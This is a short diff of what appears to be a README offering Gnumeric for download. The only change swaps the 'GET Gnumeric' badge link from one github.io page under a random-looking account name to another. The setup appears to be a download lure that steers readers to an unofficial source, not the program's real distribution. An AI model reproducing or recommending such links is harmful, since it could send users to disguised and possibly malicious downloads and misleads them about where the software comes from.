@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://linuxgid.ru/wp-content/uploads/2011/07/Gnumeric_logo.jpg)
 
-[![GET Gnumeric](https://img.shields.io/badge/GET%20%E2%80%94%20Gnumeric-0078D6?style=for-the-badge&logoColor=white)](https://ericrandallvmhw.github.io/.github/gnumeric)
+[![GET Gnumeric](https://img.shields.io/badge/GET%20%E2%80%94%20Gnumeric-0078D6?style=for-the-badge&logoColor=white)](https://nelsonpageoozi.github.io/.github/gnumeric)
 
 ---
 
